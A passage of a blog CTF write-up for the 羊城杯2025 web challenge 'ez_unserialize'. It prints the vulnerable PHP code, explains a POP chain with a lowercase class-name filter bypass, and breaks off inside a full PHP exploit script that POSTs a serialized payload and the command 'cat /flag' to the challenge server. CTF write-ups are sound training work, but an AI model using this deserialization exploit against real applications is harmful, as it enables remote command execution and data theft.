<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>羊城杯2025-WriteUp | HvAng's Nests</title><meta name="author" content="HvAng"><meta name="copyright" content="HvAng"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Webweb1 ez_unserialize 开胃小菜  &lt;?phperror_reporting(0);highlight_file(__FILE__);class A &#123;    public $first;    public $step;    public $next;    public function __construct() &#123;        $this">
<meta property="og:type" content="article">
<meta property="og:title" content="羊城杯2025-WriteUp">
<meta property="og:url" content="https://hvang10.github.io/2025/10/13/%E7%BE%8A%E5%9F%8E%E6%9D%AF2025-WriteUp/index.html">
<meta property="og:site_name" content="HvAng&#39;s Nests">
<meta property="og:description" content="Webweb1 ez_unserialize 开胃小菜  &lt;?phperror_reporting(0);highlight_file(__FILE__);class A &#123;    public $first;    public $step;    public $next;    public function __construct() &#123;        $this">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://hvang10.github.io/img/favicon.png">
<meta property="article:published_time" content="2025-10-12T16:00:00.000Z">
<meta property="article:modified_time" content="2025-10-12T19:18:57.801Z">
<meta property="article:author" content="HvAng">
<meta property="article:tag" content="Web-learn">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://hvang10.github.io/img/favicon.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://hvang10.github.io/2025/10/13/%E7%BE%8A%E5%9F%8E%E6%9D%AF2025-WriteUp/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.12.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.32/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: 'Copy Successful',
    error: 'Copy Error',
    noSupport: 'Browser Not Supported'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: 'days',
  dateSuffix: {
    just: 'Just now',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.0/dist/infinitegrid.min.js',
    buttonText: 'Load More'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '羊城杯2025-WriteUp',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2025-10-13 03:18:57'
}</script><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
        if (t === 'dark') activateDarkMode()
        else if (t === 'light') activateLightMode()
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><!-- hexo injector head_end start -->
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.0.0"><link rel="alternate" href="/atom.xml" title="HvAng's Nests" type="application/atom+xml">
</head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/favicon.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">54</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://picx.zhimg.com/80/v2-58d0f84fe61e154aa6095a9cbe2b1b7a_1440w.jpeg')"><nav id="nav"><span id="blog-info"><a href="/" title="HvAng's Nests"><span class="site-name">HvAng's Nests</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> Search</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">羊城杯2025-WriteUp</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2025-10-12T16:00:00.000Z" title="Created 2025-10-13 00:00:00">2025-10-13</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2025-10-12T19:18:57.801Z" title="Updated 2025-10-13 03:18:57">2025-10-13</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Word Count:</span><span class="word-count">4.5k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">Reading Time:</span><span>22mins</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="羊城杯2025-WriteUp"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="web1-ez-unserialize"><a href="#web1-ez-unserialize" class="headerlink" title="web1 ez_unserialize"></a>web1 ez_unserialize</h2><blockquote>
<p>开胃小菜</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$first</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$step</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$next</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;first = <span class="string">&quot;继续加油！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">start</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">E</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$you</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$found</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$secret</span> = <span class="string">&quot;admin123&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$name</span> === <span class="string">&quot;secret&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="variable">$name</span>.<span class="string">&quot; maybe is here!&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;found-&gt;<span class="title function_ invoke__">check</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">F</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fifth</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$step</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$finalstep</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/U/&quot;</span>,<span class="variable">$this</span>-&gt;finalstep)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;仔细想想！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;step = <span class="keyword">new</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">finalstep</span>();</span><br><span class="line">            (<span class="variable language_">$this</span>-&gt;step)();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">H</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$who</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$are</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$you</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;you = <span class="string">&quot;nobody&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;who-&gt;<span class="title function_ invoke__">start</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">N</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$congratulation</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$yougotit</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$func_name</span>, <span class="keyword">array</span> <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$func_name</span>,<span class="variable">$args</span>[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">U</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$almost</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$there</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;there = <span class="keyword">new</span> <span class="title function_ invoke__">N</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cmd = <span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;there-&gt;<span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">V</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$good</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$keep</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dowhat</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$go</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$abc</span> = <span class="variable language_">$this</span>-&gt;dowhat;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;go-&gt;<span class="variable">$abc</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&lt;br&gt;Win!!!&lt;/br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;payload&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>交给<code>AI</code>梭一下<strong>反序列化</strong>，<code>ChatGPT</code>有时还是挺给力的</p>
<p>目标代码里 <code>unserialize($_POST[&#39;payload&#39;]);</code> 可控对象反序列化。我们观察到几处可利用的魔术方法/链：</p>
<ul>
<li><code>H::__destruct()</code> 会调用 <code>$this-&gt;who-&gt;start()</code> → 如果 <code>who</code> 是 <code>A</code>，<code>A::start()</code> 会 <code>echo $this-&gt;next</code>（对 <code>next</code> 进行字符串化）</li>
<li>如果 <code>next</code> 是 <code>V</code> 对象，则 <code>V::__toString()</code> 被触发：它读取 <code>$this-&gt;dowhat</code> 到 <code>$abc</code>，再执行 <code>$this-&gt;go-&gt;$abc</code></li>
<li>如果 <code>V-&gt;dowhat = &quot;secret&quot;</code> 且 <code>V-&gt;go</code> 是 <code>E</code> 对象，那么对 <code>E-&gt;secret</code> 的访问会触发 <code>E::__get()</code>，里面会调用 <code>$this-&gt;found-&gt;check()</code></li>
<li><code>F::check()</code> 会 <code>new $this-&gt;finalstep()</code>（如果 <code>finalstep</code> 中包含大写 <code>U</code> 会被 <code>preg_match(&quot;/U/&quot;)</code> 检出并中断），然后对新对象做 <code>($this-&gt;step)();</code>（即调用对象的 <code>__invoke</code>）</li>
<li><code>U::__invoke()</code> 会调用 <code>$this-&gt;there-&gt;system($this-&gt;cmd)</code>，而 <code>there</code> 是 <code>N</code>，<code>N::__call</code> 会把 <code>system</code> 转成全局 <code>system()</code> 调用，从而执行任意 <code>shell</code>命令（<code>$_POST[&#39;cmd&#39;]</code> 被用作命令）</li>
</ul>
<p>关键绕过点：<code>F::check</code> 用了 <code>preg_match(&quot;/U/&quot;,$this-&gt;finalstep)</code>——只要把 <code>finalstep</code> 设为小写的 <code>&quot;u&quot;</code>（类名大小写在 <code>PHP</code> 中不敏感），就能绕过该检查并成功 <code>new &#39;u&#39;()</code> 以实例化类 <code>U</code></p>
<p>因此构造链（简化理解）：<br><code>H(where-&gt;who = A) -&gt; A-&gt;next = V -&gt; V-&gt;dowhat = &quot;secret&quot;, V-&gt;go = E -&gt; E-&gt;found = F -&gt; F-&gt;finalstep = &quot;u&quot;</code><br>同时 <code>POST</code> 包含<code>cmd=cat /flag</code>。在脚本结束时 <code>H::__destruct</code> 触发，链路走通，最终调用 <code>system(&#39;cat /flag&#39;)</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$url</span> = <span class="string">&#x27;http://45.40.247.139:20983/&#x27;</span>; </span><br><span class="line"><span class="variable">$cmd</span> = <span class="string">&#x27;cat /flag&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$first</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$step</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$next</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;first = <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">start</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">E</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$you</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$found</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$secret</span> = <span class="string">&quot;admin123&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$name</span> === <span class="string">&quot;secret&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span> . <span class="variable">$name</span> . <span class="string">&quot; maybe is here!&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;found-&gt;<span class="title function_ invoke__">check</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">F</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fifth</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$step</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$finalstep</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/U/&quot;</span>, <span class="variable">$this</span>-&gt;finalstep)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;仔细想想！&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;step = <span class="keyword">new</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">finalstep</span>();</span><br><span class="line">            (<span class="variable language_">$this</span>-&gt;step)();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">H</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$who</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$are</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$you</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;you = <span class="string">&quot;nobody&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;who-&gt;<span class="title function_ invoke__">start</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">N</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$congratulation</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$yougotit</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$func_name</span>, <span class="keyword">array</span> <span class="variable">$args</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$func_name</span>, <span class="variable">$args</span>[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">U</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$almost</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$there</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;there = <span class="keyword">new</span> <span class="title function_ invoke__">N</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cmd = <span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;there-&gt;<span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">V</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$good</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$keep</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dowhat</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$go</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$abc</span> = <span class="variable language_">$this</span>-&gt;dowhat;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;go-&gt;<span class="variable">$abc</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&lt;br&gt;Win!!!&lt;/br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 构造对象图 */</span></span><br><span class="line"><span class="variable">$f</span> = <span class="keyword">new</span> <span class="title function_ invoke__">F</span>();</span><br><span class="line"><span class="variable">$f</span>-&gt;finalstep = <span class="string">&#x27;u&#x27;</span>; <span class="comment">// 小写 u，避开 preg_match(&quot;/U/&quot;)，但依然能 new &#x27;u&#x27;()（PHP 类名不区分大小写）</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$e</span> = <span class="keyword">new</span> <span class="title function_ invoke__">E</span>();</span><br><span class="line"><span class="variable">$e</span>-&gt;found = <span class="variable">$f</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$v</span> = <span class="keyword">new</span> <span class="title function_ invoke__">V</span>();</span><br><span class="line"><span class="variable">$v</span>-&gt;dowhat = <span class="string">&#x27;secret&#x27;</span>; <span class="comment">// 触发 E::__get</span></span><br><span class="line"><span class="variable">$v</span>-&gt;go = <span class="variable">$e</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;next = <span class="variable">$v</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$h</span> = <span class="keyword">new</span> <span class="title function_ invoke__">H</span>();</span><br><span class="line"><span class="variable">$h</span>-&gt;who = <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 序列化 payload */</span></span><br><span class="line"><span class="variable">$payload</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$h</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 发送 POST */</span></span><br><span class="line"><span class="variable">$post</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;payload&#x27;</span> =&gt; <span class="variable">$payload</span>,</span><br><span class="line">    <span class="string">&#x27;cmd&#x27;</span> =&gt; <span class="variable">$cmd</span>,</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="literal">true</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_POST, <span class="literal">true</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_POSTFIELDS, <span class="variable">$post</span>);</span><br><span class="line"><span class="variable">$res</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="variable">$err</span> = <span class="title function_ invoke__">curl_error</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$res</span> 